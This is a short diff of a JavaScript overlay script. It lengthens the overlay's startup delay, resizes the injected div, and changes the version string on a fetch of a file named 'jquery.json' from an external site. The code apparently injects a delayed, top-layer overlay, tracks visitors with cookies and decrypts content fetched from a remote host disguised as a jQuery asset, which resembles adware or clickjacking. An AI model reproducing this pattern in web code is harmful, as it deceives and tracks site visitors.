@@ -81,14 +81,14 @@ function showDiv() {
     startTracker();
 
     $("#_gcli_obj" + uniqueID).css("top", "-" + siteSelected.margin + "px").css("left", "-70px").css("pointer-events", "");
-    $("#_gcli_div" + uniqueID).css("width", "780px").css("height", "200px").css("z-index", "999999").css("position", "absolute");
+    $("#_gcli_div" + uniqueID).css("width", "780px").css("height", siteSelected.margin + 200 + "px").css("z-index", "999999").css("position", "absolute");
 }
 function showOrMinimize() {
     document.getElementById('_gcli_obj' + uniqueID).onload=function(){
         if(getCookie(siteSelected.cookie) || getCookie("_gcli_delay_time")){
             setTimeout(minimizeDiv,1000);
         } else {
-            setTimeout(showDiv,10000); //10seg para iniciar
+            setTimeout(showDiv,30000); //30seg para iniciar
         }
     }
 }
@@ -132,7 +132,7 @@ function Decrypt(s1, id) {
     return result;
 }
 $(document).ready(function () {
-    fetch('https://www.iplezier.site/assets/js/c/jquery.json?ver=2.0')
+    fetch('https://www.iplezier.site/assets/js/c/jquery.json?ver=21196b59c4159060b192621cdfaf9545')
         .then(function(response) {
             return response.text();
         })
